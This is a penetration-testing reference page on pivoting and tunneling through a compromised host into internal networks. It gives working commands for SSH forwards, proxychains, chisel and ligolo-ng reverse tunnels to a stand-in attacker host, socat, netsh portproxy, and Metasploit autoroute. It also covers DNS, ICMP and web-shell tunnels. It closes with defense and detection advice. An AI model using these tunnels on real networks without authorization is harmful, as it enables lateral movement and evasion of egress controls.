# Networking — Pivoting & Tunneling

Using a host you own as a **route** into networks you can't reach directly. Scope: authorized engagements only. Once a foothold has a second interface (or just access other hosts can't give you), you tunnel your tools through it to reach the internal segment. Getting the foothold is covered in [Remote Access & Getting a Shell](Remote%20Access%20%26%20Getting%20a%20Shell.md); the Metasploit-native path is in [Metasploit → Pivoting](../Tools/Metasploit.md#pivoting-through-a-session).

> Tunnels re-route traffic through client infrastructure and can destabilize it — confirm scope. Keep a **diagram** of every hop/port you open and tear them down at the end; list them in the report.

## Contents

- [Concepts (pick the right tool)](#concepts-pick-the-right-tool)
- [Enumerate the pivot first](#enumerate-the-pivot-first)
- [SSH tunneling](#ssh-tunneling)
- [proxychains / SOCKS usage](#proxychains--socks-usage)
- [Chisel (no SSH)](#chisel-no-ssh)
- [ligolo-ng (modern, tun-based)](#ligolo-ng-modern-tun-based)
- [socat & Windows-native forwards](#socat--windows-native-forwards)
- [Metasploit pivoting](#metasploit-pivoting)
- [Double / multi-hop pivots](#double--multi-hop-pivots)
- [Covert tunnels (DNS / ICMP / HTTP)](#covert-tunnels-dns--icmp--http)
- [Port-forward quick reference](#port-forward-quick-reference)
- [Defense / detection (for the report)](#defense--detection-for-the-report)

## Concepts (pick the right tool)

| Term | What it does | Use when |
| --- | --- | --- |
| **Local forward** (`-L`) | Expose one *remote* service on **your** localhost | You need one internal port (RDP, DB, web) |
| **Remote forward** (`-R`) | Expose one *local* port on the **pivot** | Pull a file / reverse-connect back through the pivot |
| **Dynamic / SOCKS** (`-D`) | A proxy that routes **any** tool to the whole internal net | General pivoting — run nmap/nxc/curl through it |
| **Forward vs reverse** | Who initiates the connection | **Reverse** when the pivot can't be reached inbound (NAT/firewall) — it dials out to you |

Rule of thumb: **SOCKS proxy for breadth** (reach the whole subnet), **local forward for a single service**. Prefer reverse tunnels — the pivot almost always has outbound, rarely inbound.

## Enumerate the pivot first

Decide *what* to tunnel before opening anything.

```bash
# on the pivot (Linux)
ip a ; ip route ; cat /etc/hosts            # second NICs, reachable subnets, named hosts
ss -tulpn                                   # localhost-only services = prime forward targets
arp -a                                      # neighbors it already talks to
for h in 10.10.20.{1..254}; do ping -c1 -W1 $h >/dev/null && echo "$h up"; done   # quick sweep
```

```text
# Windows pivot
ipconfig /all   &   route print   &   arp -a   &   netstat -ano
```

A service bound to `127.0.0.1` on the pivot is invisible externally — that's exactly what a forward/SOCKS exposes.

## SSH tunneling

The baseline when the foothold has SSH (you, as a user on the box, or creds to it).

```bash
# Local forward: internal web on your localhost:8080
ssh -L 8080:10.10.20.5:80 user@PIVOT            # browse http://127.0.0.1:8080

# Dynamic SOCKS proxy: route everything through the pivot
ssh -D 1080 user@PIVOT                          # then use proxychains (below)

# Reverse forward: pivot can't be reached inbound -> it connects to you
ssh -R 9001:127.0.0.1:9001 user@PIVOT           # e.g. catch a shell from deeper in

# Quality-of-life flags
ssh -fN -D 1080 user@PIVOT                       # -f background, -N no shell (tunnel only)

# sshuttle: a "VPN over SSH" — no proxychains, transparent routing of a whole subnet
sshuttle -r user@PIVOT 10.10.20.0/24             # needs python on the pivot
```

Windows foothold with SSH out: `ssh.exe` ships with modern Windows; same flags. No SSH client? use **plink** (`plink -D 1080 user@PIVOT`) or [netsh portproxy](#socat--windows-native-forwards).

## proxychains / SOCKS usage

```bash
# /etc/proxychains4.conf  -> set the SOCKS port your tunnel opened
[ProxyList]
socks5 127.0.0.1 1080

proxychains nmap -sT -Pn 10.10.20.5             # MUST be -sT (TCP connect) and -Pn through SOCKS
proxychains nxc smb 10.10.20.0/24 -u u -p p     # tools that don't support proxies natively
proxychains curl http://10.10.20.5
```

SOCKS caveats: **TCP connect scans only** (`-sT`), **no ICMP** (`-Pn`, and ping sweeps won't work through it), and UDP mostly doesn't traverse SOCKS. Set `proxy_dns` in the conf to resolve internal names through the tunnel. Scanning through a proxy is slow — target specific hosts/ports.

## Chisel (no SSH)

Fast TCP/SOCKS tunnel over HTTP when there's no SSH. Single Go binary, drop it on the pivot.

```bash
# Reverse SOCKS (most common: pivot has outbound to you)
./chisel server -p 8000 --reverse               # on ATTACKER
./chisel client ATTACKER:8000 R:socks           # on the PIVOT -> opens SOCKS on attacker:1080

# Reverse single-port forward (expose internal 3389 on your localhost)
./chisel client ATTACKER:8000 R:3389:10.10.20.5:3389

# Forward mode (you can reach the pivot inbound)
./chisel server -p 8000                          # on the PIVOT
./chisel client PIVOT:8000 1080:socks            # on ATTACKER
```

Add `--tls` / a shared `auth user:pass` for a quieter, authenticated channel.

## ligolo-ng (modern, tun-based)

Gives you a real network interface to the internal subnet — no proxychains, native tools work normally. Usually the smoothest pivot today.

```bash
# ATTACKER: set up the tun interface and start the listener
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                                # ligolo-ng proxy (listens :11601)

# PIVOT: run the agent, dialing back to you
./agent -connect ATTACKER:11601 -ignore-cert

# back in the proxy console: pick the session, then route the subnet to the tun
ligolo> session        (select agent)
ligolo> start
# ATTACKER: route the internal subnet through the tun interface
sudo ip route add 10.10.20.0/24 dev ligolo
# now nmap/nxc/browser hit 10.10.20.0/24 directly, no proxychains
```

## socat & Windows-native forwards

```bash
# socat relay on a Linux pivot (expose internal 445 on the pivot's own 4455)
socat TCP-LISTEN:4455,fork,reuseaddr TCP:10.10.20.5:445

# Windows pivot, no tools: built-in port proxy (persists; remember to delete it)
netsh interface portproxy add v4tov4 listenport=4455 connectaddress=10.10.20.5 connectport=445
netsh advfirewall firewall add rule name=fwd dir=in action=allow protocol=TCP localport=4455
# cleanup:
netsh interface portproxy delete v4tov4 listenport=4455
```

## Metasploit pivoting

From an existing Meterpreter session (full detail in [Metasploit](../Tools/Metasploit.md#pivoting-through-a-session)):

```text
run autoroute -s 10.10.20.0/24          # route msf modules through the session
use auxiliary/server/socks_proxy ; run  # expose a SOCKS proxy for external tools (via proxychains)
portfwd add -l 3389 -p 3389 -r 10.10.20.5   # local forward to an internal host
```

## Double / multi-hop pivots

Reaching a third network behind a second pivot — chain tunnels.

```bash
# SSH: jump through PIVOT1 to SSH into PIVOT2, then SOCKS from there (ProxyJump)
ssh -J user@PIVOT1 -D 1081 user@PIVOT2
# or stack SOCKS in proxychains.conf (traffic walks top-to-bottom):
#   socks5 127.0.0.1 1080   (pivot1)
#   socks5 127.0.0.1 1081   (pivot2, reachable only via pivot1)
```

ligolo-ng handles multi-hop cleanly with multiple agents/listeners; chisel chains by running a client on pivot2 that points at a port pivot1 forwards. Keep the diagram updated — multi-hop is where mistakes (and loops) happen.

## Covert tunnels (DNS / ICMP / HTTP)

When only certain egress is allowed out of the segment:

- **DNS** — `dnscat2` or `iodine`: tunnel a shell/SOCKS over DNS when DNS is the only thing that resolves out. Slow, but beats a fully filtered egress.
- **ICMP** — `icmptunnel` / `ptunnel`: tunnel over ping when ICMP is permitted.
- **HTTP(S)** — `reGeorg` / `Neo-reGeorg`: drop a tunneling script on a compromised **web server** (webroot) and SOCKS through it over plain HTTP — ideal when the only outbound is the web app itself.

These are noisier/slower; reach for them only when TCP/SSH/chisel egress is blocked.

## Port-forward quick reference

| Goal | Command |
| --- | --- |
| One internal port → my localhost | `ssh -L LPORT:INTERNAL:RPORT user@PIVOT` |
| Whole subnet via SOCKS | `ssh -D 1080 user@PIVOT` + proxychains |
| Pivot dials out to me (no inbound) | `ssh -R RPORT:127.0.0.1:LPORT user@PIVOT` |
| No SSH, reverse SOCKS | `chisel server -p 8000 --reverse` / `chisel client ATK:8000 R:socks` |
| Native interface, no proxychains | ligolo-ng agent/proxy + `ip route add` |
| Windows, no tools | `netsh interface portproxy add ...` |
| From a Meterpreter session | `run autoroute` + `socks_proxy` / `portfwd` |

## Defense / detection (for the report)

- **Segment the network** so a single foothold can't route everywhere; host-based firewalls denying lateral/inbound; deny workstation-to-workstation.
- **Egress filtering** — default-deny outbound; allow only required destinations/ports; inspect for long-lived outbound TCP and non-standard SOCKS/HTTP tunnels.
- **Detect:** a workstation suddenly acting as a router/relay (forwarding, many internal TCP connections); `chisel`/`ligolo`/`plink`/`socat` binaries or `netsh interface portproxy` entries; `ssh -R/-D` from servers; high-volume or high-entropy DNS (DNS tunneling); ICMP with large/odd payloads.
- **EDR/Sysmon** on new listening ports, `netsh portproxy` changes, and known tunneling tool hashes/names.

## Related

[Networking Overview](Networking%20Overview.md) · [Remote Access & Getting a Shell](Remote%20Access%20%26%20Getting%20a%20Shell.md) · [Metasploit → Pivoting](../Tools/Metasploit.md#pivoting-through-a-session) · [GPEN Cheatsheet](../GPEN%20Cheatsheet/README.md) (SANS pivoting handout)
